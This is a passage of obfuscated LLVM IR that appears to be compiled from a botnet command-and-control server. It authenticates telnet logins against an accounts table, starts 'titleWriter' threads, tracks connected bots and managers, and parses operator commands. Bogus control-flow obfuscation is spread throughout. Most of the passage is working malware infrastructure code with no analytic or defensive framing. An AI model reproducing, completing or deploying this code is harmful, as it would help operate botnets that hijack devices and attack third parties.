  %186 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %170, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.16, i32 0, i32 0), i8* %175, i8* %180, i8* %185)
  %187 = load i32, i32* %17, align 4
  %188 = add nsw i32 %187, 1
  store i32 %188, i32* %17, align 4
  br label %148

; <label>:189:                                    ; preds = %originalBBpart28
  %190 = load i32, i32* @x.17
  %191 = load i32, i32* @y.18
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %189
  %198 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %199 = call i32 (i8*, i8*, ...) @sprintf(i8* %198, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.17, i32 0, i32 0)) #7
  %200 = load i32, i32* %4, align 4
  %201 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %202 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %203 = call i64 @strlen(i8* %202) #8
  %204 = call i64 @send(i32 %200, i8* %201, i64 %203, i32 16384)
  %205 = icmp eq i64 %204, -1
  %206 = load i32, i32* @x.17
  %207 = load i32, i32* @y.18
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %205, label %214, label %215

; <label>:214:                                    ; preds = %originalBBpart212
  br label %4181

; <label>:215:                                    ; preds = %originalBBpart212
  %216 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %217 = call i32 (i8*, i8*, ...) @sprintf(i8* %216, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.18, i32 0, i32 0)) #7
  %218 = load i32, i32* %4, align 4
  %219 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %220 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %221 = call i64 @strlen(i8* %220) #8
  %222 = call i64 @send(i32 %218, i8* %219, i64 %221, i32 16384)
  %223 = icmp eq i64 %222, -1
  br i1 %223, label %224, label %225

; <label>:224:                                    ; preds = %215
  br label %4181

; <label>:225:                                    ; preds = %215
  %226 = load i32, i32* @x.17
  %227 = load i32, i32* @y.18
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %225
  %234 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %235 = load i32, i32* %4, align 4
  %236 = call i32 @fdgets(i8* %234, i32 2048, i32 %235)
  %237 = icmp slt i32 %236, 1
  %238 = load i32, i32* @x.17
  %239 = load i32, i32* @y.18
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %237, label %246, label %263

; <label>:246:                                    ; preds = %originalBBpart216
  %247 = load i32, i32* @x.17
  %248 = load i32, i32* @y.18
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %246
  %255 = load i32, i32* @x.17
  %256 = load i32, i32* @y.18
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %4181

; <label>:263:                                    ; preds = %originalBBpart216
  %264 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %264)
  %265 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i32 0, i32 0
  %266 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %267 = call i32 (i8*, i8*, ...) @sprintf(i8* %265, i8* %266) #7
  %268 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  store i8* %268, i8** %9, align 8
  %269 = load i8*, i8** %9, align 8
  %270 = call i32 @Search_in_File(i8* %269)
  store i32 %270, i32* %5, align 4
  %271 = load i8*, i8** %9, align 8
  %272 = load i32, i32* %5, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %273
  %275 = getelementptr inbounds %struct.account, %struct.account* %274, i32 0, i32 0
  %276 = getelementptr inbounds [20 x i8], [20 x i8]* %275, i32 0, i32 0
  %277 = call i32 @strcmp(i8* %271, i8* %276) #8
  %278 = icmp eq i32 %277, 0
  br i1 %278, label %279, label %356

; <label>:279:                                    ; preds = %263
  %280 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %281 = call i32 (i8*, i8*, ...) @sprintf(i8* %280, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.20, i32 0, i32 0)) #7
  %282 = load i32, i32* %4, align 4
  %283 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %284 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %285 = call i64 @strlen(i8* %284) #8
  %286 = call i64 @send(i32 %282, i8* %283, i64 %285, i32 16384)
  %287 = icmp eq i64 %286, -1
  br i1 %287, label %288, label %305

; <label>:288:                                    ; preds = %279
  %289 = load i32, i32* @x.17
  %290 = load i32, i32* @y.18
  %291 = sub i32 %289, 1
  %292 = mul i32 %289, %291
  %293 = urem i32 %292, 2
  %294 = icmp eq i32 %293, 0
  %295 = icmp slt i32 %290, 10
  %296 = or i1 %294, %295
  br i1 %296, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %288
  %297 = load i32, i32* @x.17
  %298 = load i32, i32* @y.18
  %299 = sub i32 %297, 1
  %300 = mul i32 %297, %299
  %301 = urem i32 %300, 2
  %302 = icmp eq i32 %301, 0
  %303 = icmp slt i32 %298, 10
  %304 = or i1 %302, %303
  br i1 %304, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %4181

; <label>:305:                                    ; preds = %279
  %306 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %307 = load i32, i32* %4, align 4
  %308 = call i32 @fdgets(i8* %306, i32 2048, i32 %307)
  %309 = icmp slt i32 %308, 1
  br i1 %309, label %310, label %311

; <label>:310:                                    ; preds = %305
  br label %4181

; <label>:311:                                    ; preds = %305
  %312 = load i32, i32* @x.17
  %313 = load i32, i32* @y.18
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %311
  %320 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %320)
  %321 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %322 = load i32, i32* %5, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %323
  %325 = getelementptr inbounds %struct.account, %struct.account* %324, i32 0, i32 1
  %326 = getelementptr inbounds [20 x i8], [20 x i8]* %325, i32 0, i32 0
  %327 = call i32 @strcmp(i8* %321, i8* %326) #8
  %328 = icmp ne i32 %327, 0
  %329 = load i32, i32* @x.17
  %330 = load i32, i32* @y.18
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %328, label %337, label %354

; <label>:337:                                    ; preds = %originalBBpart228
  %338 = load i32, i32* @x.17
  %339 = load i32, i32* @y.18
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %337
  %346 = load i32, i32* @x.17
  %347 = load i32, i32* @y.18
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %357

; <label>:354:                                    ; preds = %originalBBpart228
  %355 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %355, i8 0, i64 2048, i32 16, i1 false)
  br label %393

; <label>:356:                                    ; preds = %263
  br label %357

; <label>:357:                                    ; preds = %356, %originalBBpart232
  %358 = load i8*, i8** %3, align 8
  %359 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %358) #7
  %360 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %360, i8 0, i64 2048, i32 16, i1 false)
  %361 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %362 = call i32 (i8*, i8*, ...) @sprintf(i8* %361, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.21, i32 0, i32 0)) #7
  %363 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %364 = call i32 (i8*, i8*, ...) @sprintf(i8* %363, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.22, i32 0, i32 0)) #7
  %365 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %366 = call i32 (i8*, i8*, ...) @sprintf(i8* %365, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.23, i32 0, i32 0)) #7
  %367 = call i32 @sleep(i32 1)
  %368 = load i32, i32* %4, align 4
  %369 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %370 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %371 = call i64 @strlen(i8* %370) #8
  %372 = call i64 @send(i32 %368, i8* %369, i64 %371, i32 16384)
  %373 = icmp eq i64 %372, -1
  br i1 %373, label %374, label %375

; <label>:374:                                    ; preds = %357
  br label %4181

; <label>:375:                                    ; preds = %357
  %376 = load i32, i32* %4, align 4
  %377 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %378 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %379 = call i64 @strlen(i8* %378) #8
  %380 = call i64 @send(i32 %376, i8* %377, i64 %379, i32 16384)
  %381 = icmp eq i64 %380, -1
  br i1 %381, label %382, label %383

; <label>:382:                                    ; preds = %375
  br label %4181

; <label>:383:                                    ; preds = %375
  %384 = load i32, i32* %4, align 4
  %385 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %386 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %387 = call i64 @strlen(i8* %386) #8
  %388 = call i64 @send(i32 %384, i8* %385, i64 %387, i32 16384)
  %389 = icmp eq i64 %388, -1
  br i1 %389, label %390, label %391

; <label>:390:                                    ; preds = %383
  br label %4181

; <label>:391:                                    ; preds = %383
  %392 = call i32 @sleep(i32 7)
  br label %4181

; <label>:393:                                    ; preds = %4076, %4055, %4050, %4029, %354
  %394 = load i8*, i8** %3, align 8
  %395 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %394) #7
  %396 = load i32, i32* %4, align 4
  %397 = call i64 @send(i32 %396, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i32 0, i32 0), i64 14, i32 16384)
  %398 = icmp eq i64 %397, -1
  br i1 %398, label %399, label %400

; <label>:399:                                    ; preds = %393
  br label %4181

; <label>:400:                                    ; preds = %393
  %401 = load i32, i32* @x.17
  %402 = load i32, i32* @y.18
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %400
  %409 = load i32, i32* %4, align 4
  %410 = call i64 @send(i32 %409, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.25, i32 0, i32 0), i64 2, i32 16384)
  %411 = icmp eq i64 %410, -1
  %412 = load i32, i32* @x.17
  %413 = load i32, i32* @y.18
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %411, label %420, label %437

; <label>:420:                                    ; preds = %originalBBpart236
  %421 = load i32, i32* @x.17
  %422 = load i32, i32* @y.18
  %423 = sub i32 %421, 1
  %424 = mul i32 %421, %423
  %425 = urem i32 %424, 2
  %426 = icmp eq i32 %425, 0
  %427 = icmp slt i32 %422, 10
  %428 = or i1 %426, %427
  br i1 %428, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %420
  %429 = load i32, i32* @x.17
  %430 = load i32, i32* @y.18
  %431 = sub i32 %429, 1
  %432 = mul i32 %429, %431
  %433 = urem i32 %432, 2
  %434 = icmp eq i32 %433, 0
  %435 = icmp slt i32 %430, 10
  %436 = or i1 %434, %435
  br i1 %436, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %4181

; <label>:437:                                    ; preds = %originalBBpart236
  %438 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i32 0, i32 0
  %439 = call i32 (i8*, i8*, ...) @sprintf(i8* %438, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.26, i32 0, i32 0)) #7
  %440 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i32 0, i32 0
  %441 = call i32 (i8*, i8*, ...) @sprintf(i8* %440, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.27, i32 0, i32 0)) #7
  %442 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i32 0, i32 0
  %443 = call i32 (i8*, i8*, ...) @sprintf(i8* %442, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.28, i32 0, i32 0)) #7
  %444 = load i32, i32* %4, align 4
  %445 = call i64 @send(i32 %444, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i32 0, i32 0), i64 14, i32 16384)
  %446 = icmp eq i64 %445, -1
  br i1 %446, label %447, label %464

; <label>:447:                                    ; preds = %437
  %448 = load i32, i32* @x.17
  %449 = load i32, i32* @y.18
  %450 = sub i32 %448, 1
  %451 = mul i32 %448, %450
  %452 = urem i32 %451, 2
  %453 = icmp eq i32 %452, 0
  %454 = icmp slt i32 %449, 10
  %455 = or i1 %453, %454
  br i1 %455, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %447
  %456 = load i32, i32* @x.17
  %457 = load i32, i32* @y.18
  %458 = sub i32 %456, 1
  %459 = mul i32 %456, %458
  %460 = urem i32 %459, 2
  %461 = icmp eq i32 %460, 0
  %462 = icmp slt i32 %457, 10
  %463 = or i1 %461, %462
  br i1 %463, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %4181

; <label>:464:                                    ; preds = %437
  %465 = load i32, i32* %4, align 4
  %466 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i32 0, i32 0
  %467 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i32 0, i32 0
  %468 = call i64 @strlen(i8* %467) #8
  %469 = call i64 @send(i32 %465, i8* %466, i64 %468, i32 16384)
  %470 = icmp eq i64 %469, -1
  br i1 %470, label %471, label %488

; <label>:471:                                    ; preds = %464
  %472 = load i32, i32* @x.17
  %473 = load i32, i32* @y.18
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %471
  %480 = load i32, i32* @x.17
  %481 = load i32, i32* @y.18
  %482 = sub i32 %480, 1
  %483 = mul i32 %480, %482
  %484 = urem i32 %483, 2
  %485 = icmp eq i32 %484, 0
  %486 = icmp slt i32 %481, 10
  %487 = or i1 %485, %486
  br i1 %487, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %4181

; <label>:488:                                    ; preds = %464
  %489 = load i32, i32* @x.17
  %490 = load i32, i32* @y.18
  %491 = sub i32 %489, 1
  %492 = mul i32 %489, %491
  %493 = urem i32 %492, 2
  %494 = icmp eq i32 %493, 0
  %495 = icmp slt i32 %490, 10
  %496 = or i1 %494, %495
  br i1 %496, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %488
  %497 = load i32, i32* %4, align 4
  %498 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i32 0, i32 0
  %499 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i32 0, i32 0
  %500 = call i64 @strlen(i8* %499) #8
  %501 = call i64 @send(i32 %497, i8* %498, i64 %500, i32 16384)
  %502 = icmp eq i64 %501, -1
  %503 = load i32, i32* @x.17
  %504 = load i32, i32* @y.18
  %505 = sub i32 %503, 1
  %506 = mul i32 %503, %505
  %507 = urem i32 %506, 2
  %508 = icmp eq i32 %507, 0
  %509 = icmp slt i32 %504, 10
  %510 = or i1 %508, %509
  br i1 %510, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %502, label %511, label %528

; <label>:511:                                    ; preds = %originalBBpart252
  %512 = load i32, i32* @x.17
  %513 = load i32, i32* @y.18
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %511
  %520 = load i32, i32* @x.17
  %521 = load i32, i32* @y.18
  %522 = sub i32 %520, 1
  %523 = mul i32 %520, %522
  %524 = urem i32 %523, 2
  %525 = icmp eq i32 %524, 0
  %526 = icmp slt i32 %521, 10
  %527 = or i1 %525, %526
  br i1 %527, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %4181

; <label>:528:                                    ; preds = %originalBBpart252
  %529 = load i32, i32* %4, align 4
  %530 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i32 0, i32 0
  %531 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i32 0, i32 0
  %532 = call i64 @strlen(i8* %531) #8
  %533 = call i64 @send(i32 %529, i8* %530, i64 %532, i32 16384)
  %534 = icmp eq i64 %533, -1
  br i1 %534, label %535, label %536

; <label>:535:                                    ; preds = %528
  br label %4181

; <label>:536:                                    ; preds = %528
  br label %537

; <label>:537:                                    ; preds = %536
  %538 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %539 = load i32, i32* %5, align 4
  %540 = sext i32 %539 to i64
  %541 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %540
  %542 = getelementptr inbounds %struct.account, %struct.account* %541, i32 0, i32 0
  %543 = getelementptr inbounds [20 x i8], [20 x i8]* %542, i32 0, i32 0
  %544 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %545 = call i32 (i8*, i8*, ...) @sprintf(i8* %538, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %543, i8* %544) #7
  %546 = load i32, i32* %4, align 4
  %547 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %548 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %549 = call i64 @strlen(i8* %548) #8
  %550 = call i64 @send(i32 %546, i8* %547, i64 %549, i32 16384)
  %551 = icmp eq i64 %550, -1
  br i1 %551, label %552, label %553

; <label>:552:                                    ; preds = %537
  br label %4181

; <label>:553:                                    ; preds = %537
  br label %554

; <label>:554:                                    ; preds = %553
  %555 = load i8*, i8** %3, align 8
  %556 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %555) #7
  %557 = load i32, i32* %4, align 4
  %558 = sext i32 %557 to i64
  %559 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %558
  %560 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %559, i32 0, i32 1
  store i32 1, i32* %560, align 4
  br label %561

; <label>:561:                                    ; preds = %4157, %originalBBpart2520, %2657, %2438, %1869, %1696, %1379, %1164, %originalBBpart2100, %554
  %562 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %563 = load i32, i32* %4, align 4
  %564 = call i32 @fdgets(i8* %562, i32 2048, i32 %563)
  %565 = icmp sgt i32 %564, 0
  br i1 %565, label %566, label %4180

; <label>:566:                                    ; preds = %561
  %567 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %568 = call i8* @strstr(i8* %567, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0)) #8
  %569 = icmp ne i8* %568, null
  br i1 %569, label %582, label %570

; <label>:570:                                    ; preds = %566
  %571 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %572 = call i8* @strstr(i8* %571, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i32 0, i32 0)) #8
  %573 = icmp ne i8* %572, null
  br i1 %573, label %582, label %574

; <label>:574:                                    ; preds = %570
  %575 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %576 = call i8* @strstr(i8* %575, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #8
  %577 = icmp ne i8* %576, null
  br i1 %577, label %582, label %578

; <label>:578:                                    ; preds = %574
  %579 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %580 = call i8* @strstr(i8* %579, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.33, i32 0, i32 0)) #8
  %581 = icmp ne i8* %580, null
  br i1 %581, label %582, label %611

; <label>:582:                                    ; preds = %578, %574, %570, %566
  %583 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %584 = call i32 @clientsConnected()
  %585 = load volatile i32, i32* @managesConnected, align 4
  %586 = call i32 (i8*, i8*, ...) @sprintf(i8* %583, i8* getelementptr inbounds ([141 x i8], [141 x i8]* @.str.34, i32 0, i32 0), i32 %584, i32 %585) #7
  %587 = load i32, i32* %4, align 4
  %588 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %589 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %590 = call i64 @strlen(i8* %589) #8
  %591 = call i64 @send(i32 %587, i8* %588, i64 %590, i32 16384)
  %592 = icmp eq i64 %591, -1
  br i1 %592, label %593, label %610

; <label>:593:                                    ; preds = %582
  %594 = load i32, i32* @x.17
  %595 = load i32, i32* @y.18
  %596 = sub i32 %594, 1
  %597 = mul i32 %594, %596
  %598 = urem i32 %597, 2
  %599 = icmp eq i32 %598, 0
  %600 = icmp slt i32 %595, 10
  %601 = or i1 %599, %600
  br i1 %601, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %593
  %602 = load i32, i32* @x.17
  %603 = load i32, i32* @y.18
  %604 = sub i32 %602, 1
  %605 = mul i32 %602, %604
  %606 = urem i32 %605, 2
  %607 = icmp eq i32 %606, 0
  %608 = icmp slt i32 %603, 10
  %609 = or i1 %607, %608
  br i1 %609, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %610

; <label>:610:                                    ; preds = %originalBBpart260, %582
  br label %611

; <label>:611:                                    ; preds = %610, %578
  %612 = load i32, i32* @x.17
  %613 = load i32, i32* @y.18
  %614 = sub i32 %612, 1
  %615 = mul i32 %612, %614
  %616 = urem i32 %615, 2
  %617 = icmp eq i32 %616, 0
  %618 = icmp slt i32 %613, 10
  %619 = or i1 %617, %618
  br i1 %619, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %611
  %620 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %621 = call i8* @strstr(i8* %620, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i32 0, i32 0)) #8
  %622 = icmp ne i8* %621, null
  %623 = load i32, i32* @x.17
  %624 = load i32, i32* @y.18
  %625 = sub i32 %623, 1
  %626 = mul i32 %623, %625
  %627 = urem i32 %626, 2
  %628 = icmp eq i32 %627, 0
  %629 = icmp slt i32 %624, 10
  %630 = or i1 %628, %629
  br i1 %630, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %622, label %655, label %631

; <label>:631:                                    ; preds = %originalBBpart264
  %632 = load i32, i32* @x.17
  %633 = load i32, i32* @y.18
  %634 = sub i32 %632, 1
  %635 = mul i32 %632, %634
  %636 = urem i32 %635, 2
  %637 = icmp eq i32 %636, 0
  %638 = icmp slt i32 %633, 10
  %639 = or i1 %637, %638
  br i1 %639, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %631
  %640 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %641 = call i8* @strstr(i8* %640, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0)) #8
  %642 = icmp ne i8* %641, null
  %643 = load i32, i32* @x.17
  %644 = load i32, i32* @y.18
  %645 = sub i32 %643, 1
  %646 = mul i32 %643, %645
  %647 = urem i32 %646, 2
  %648 = icmp eq i32 %647, 0
  %649 = icmp slt i32 %644, 10
  %650 = or i1 %648, %649
  br i1 %650, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %642, label %655, label %651

; <label>:651:                                    ; preds = %originalBBpart268
  %652 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %653 = call i8* @strstr(i8* %652, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0)) #8
  %654 = icmp ne i8* %653, null
  br i1 %654, label %655, label %914

; <label>:655:                                    ; preds = %651, %originalBBpart268, %originalBBpart264
  %656 = load i32, i32* @x.17
  %657 = load i32, i32* @y.18
  %658 = sub i32 %656, 1
  %659 = mul i32 %656, %658
  %660 = urem i32 %659, 2
  %661 = icmp eq i32 %660, 0
  %662 = icmp slt i32 %657, 10
  %663 = or i1 %661, %662
  br i1 %663, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %655
  %664 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %665 = call i32 (i8*, i8*, ...) @sprintf(i8* %664, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.38, i32 0, i32 0)) #7
  %666 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %667 = call i32 (i8*, i8*, ...) @sprintf(i8* %666, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %668 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %669 = call i32 (i8*, i8*, ...) @sprintf(i8* %668, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.40, i32 0, i32 0)) #7
  %670 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
